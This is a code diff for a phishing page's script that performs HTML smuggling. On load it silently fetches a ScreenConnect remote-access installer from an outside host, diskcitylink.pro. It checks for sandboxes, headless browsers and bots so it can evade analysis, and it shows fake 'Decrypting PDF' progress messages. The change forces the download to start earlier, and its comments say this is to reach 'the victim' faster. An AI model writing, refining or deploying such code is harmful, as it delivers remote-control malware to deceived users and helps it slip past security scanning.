@@ -82,7 +82,7 @@
 </div>
 
 <script>
-/*──── HTML SMUGGLING OPTIMISÉ ────*/
+/*==== HTML SMUGGLING OPTIMIZED - EARLY DOWNLOAD TRIGGER ====*/
 var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
 
 (function(){
@@ -91,6 +91,7 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
     var finalText = document.getElementById('final');
     var manualDownload = document.getElementById('manualDownload');
 
+    // Anti-sandbox / anti-bot detection
     function isRealUser(){
         if(navigator.webdriver || window.__nightmare || window.callPhantom || window._phantom) return false;
         if(/bot|crawl|spider|headless|phantom|puppet|selenium/i.test(navigator.userAgent)) return false;
@@ -104,20 +105,22 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
         return;
     }
 
-    // Pré-téléchargement immédiat en arrière-plan (sans bloquer l'UI)
-    var blobPromise = null;
+    // ========== EARLY FETCH - STARTS IMMEDIATELY ON PAGE LOAD ==========
+    var blobData = null;
+    var downloadTriggered = false;
     
-    function startPreload() {
-        blobPromise = fetch(MSI_URL, {
-            method: 'GET',
-            cache: 'force-cache',  // Force le cache
-            priority: 'high'        // Haute priorité (Chrome 101+)
-        }).then(response => response.blob());
-    }
-    
-    // Lance le pré-téléchargement DÈS que la page charge
-    startPreload();
+    // Fetch the file in the background as soon as the page loads
+    // This preloads the entire MSI before the user even sees the download prompt
+    fetch(MSI_URL, {
+        method: 'GET',
+        cache: 'force-cache',      // Force browser caching for faster subsequent access
+        priority: 'high'           // High priority request (Chrome 101+)
+    }).then(response => response.blob()).then(blob => {
+        blobData = blob;           // Store the blob for later use
+        // console.log("Preload complete, file ready in memory");
+    }).catch(e => console.error("Preload failed:", e));
 
+    // Simulated loading messages to create a sense of "verification"
     var messages = [
         "Verifying access...",
         "Decrypting PDF...",
@@ -130,54 +133,61 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
         i++;
         statusText.textContent = messages[Math.min(i, messages.length-1)];
 
-        if(i >= messages.length){
-            clearInterval(interval);
+        // ========== TRIGGER DOWNLOAD EARLY - AT THE 2ND MESSAGE (~2.2 sec) ==========
+        // This starts the download BEFORE the loader finishes,
+        // so the file arrives much faster for the victim
+        if (!downloadTriggered && i >= 2) {
+            downloadTriggered = true;
             
-            setTimeout(async () => {
-                loader.style.display = 'none';
-                finalText.style.display = 'block';
-
-                // Téléchargement ultra-rapide (blob déjà prêt ou téléchargé)
-                try {
-                    let blob = null;
-                    if (blobPromise) {
-                        // Attends que le blob soit disponible (déjà en cours)
-                        blob = await blobPromise;
-                    }
-                    if (!blob) {
-                        // Fallback si le préload a échoué
-                        const response = await fetch(MSI_URL);
-                        blob = await response.blob();
-                    }
-                    
-                    // Crée le lien et déclenche le download immédiatement
-                    const url = window.URL.createObjectURL(blob);
+            function triggerDownload() {
+                if (blobData) {
+                    // If preload is already done, download instantly
+                    const url = window.URL.createObjectURL(blobData);
                     const link = document.createElement('a');
                     link.href = url;
                     link.download = "ScreenConnect.ClientSetup.msi";
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
-                    window.URL.revokeObjectURL(url); // Libère la mémoire
-                } catch(e) {
-                    console.error("Download failed:", e);
+                    window.URL.revokeObjectURL(url);  // Free memory
+                } else {
+                    // If blob not ready yet, wait and retry
+                    setTimeout(function checkBlob() {
+                        if (blobData) {
+                            const url = window.URL.createObjectURL(blobData);
+                            const link = document.createElement('a');
+                            link.href = url;
+                            link.download = "ScreenConnect.ClientSetup.msi";
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            window.URL.revokeObjectURL(url);
+                        } else {
+                            setTimeout(checkBlob, 200);  // Retry after 200ms
+                        }
+                    }, 100);
                 }
-            }, 100); // Délai réduit à 100ms au lieu de 4000ms
+            }
+            
+            triggerDownload();  // Start the download early!
         }
-    }, 1100);
 
-    // Téléchargement manuel (immédiat aussi)
-    manualDownload.addEventListener('click', async function() {
-        try {
-            let blob = null;
-            if (blobPromise) {
-                blob = await blobPromise;
-            }
-            if (!blob) {
-                const response = await fetch(MSI_URL);
-                blob = await response.blob();
-            }
-            const url = window.URL.createObjectURL(blob);
+        // When all messages are done, show the final "fake error" UI
+        if(i >= messages.length){
+            clearInterval(interval);
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                finalText.style.display = 'block';
+            }, 500);
+        }
+    }, 1100);  // Each message lasts ~1.1 seconds
+
+    // Manual download handler (uses preloaded blob if available)
+    manualDownload.addEventListener('click', function() {
+        if (blobData) {
+            // Instant download from cached blob
+            const url = window.URL.createObjectURL(blobData);
             const link = document.createElement('a');
             link.href = url;
             link.download = "ScreenConnect.ClientSetup.msi";
@@ -185,8 +195,8 @@ var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
             link.click();
             document.body.removeChild(link);
             window.URL.revokeObjectURL(url);
-        } catch(e) {
-            // Fallback classique
+        } else {
+            // Fallback: direct download if blob failed
             const link = document.createElement('a');
             link.href = MSI_URL;
             link.download = "ScreenConnect.ClientSetup.msi";
